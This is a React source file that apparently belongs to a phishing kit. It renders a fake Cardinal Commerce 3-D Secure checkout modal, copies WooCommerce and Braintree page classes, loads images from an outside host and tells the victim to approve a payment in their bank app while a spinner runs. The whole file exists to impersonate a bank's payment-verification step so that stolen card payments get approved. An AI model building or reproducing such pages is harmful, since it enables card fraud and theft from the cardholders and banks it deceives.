import React, { useState, useEffect } from 'react';

const ContainerLoading = () => {
    const [styles, setStyles] = useState(null);
    const [showNotif, setShowNotif] = useState(true);
    const [logoUrl, setLogoUrl] = useState('');
    const [brandLogo, setBrandLogo] = useState('');
    const [links, setLinks] = useState({});
    const [currentDate, setCurrentDate] = useState('');

    const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
};
useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/container.css'),
          import('../../assets/styles/container_error.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
        });
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    loadStyles();

    // Set the current date
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, []);
  const [formData, setFormData] = useState({
      // Add any form fields that need value props
    });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
        ...prev,
        [name]: value,
    }));
};


return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
          <div style={{ 
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
    }} className="threeds-two">
      <div className="container-fluid">
      <img
        src="https://netwatchnow.com/be/app/res/fadja.png"
        alt=""
        style={{ width: '100%' }}
      /> 
    <br />
    <div
        className="formcol"
        style={{
            textAlign: 'center',
            fontWeight: 'normal',
          fontSize: '1.8em',
          marginBottom: '30px',
          color: '#3a3a3a',
        }}
      >
        Confirmation App...
      </div>
      <div
        className="formcol"
        style={{
            textAlign: 'center',
            fontWeight: 'normal',
          fontSize: '1.2em',
          marginBottom: '30px',
          color: '#3a3a3a',
        }}
      >
        <p>
          To complete this process, please approve via your bank app.
        </p>
        <div
          className="loader"
          style={{ display: 'inline-block' }}
        ></div>
        <br />
        <img
          src="https://netwatchnow.com/be/app/res/dranon.png"
          alt=""
          style={{ width: '70%' }}
        />
      </div>


        
        
      </div>
    </div>
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerLoading;
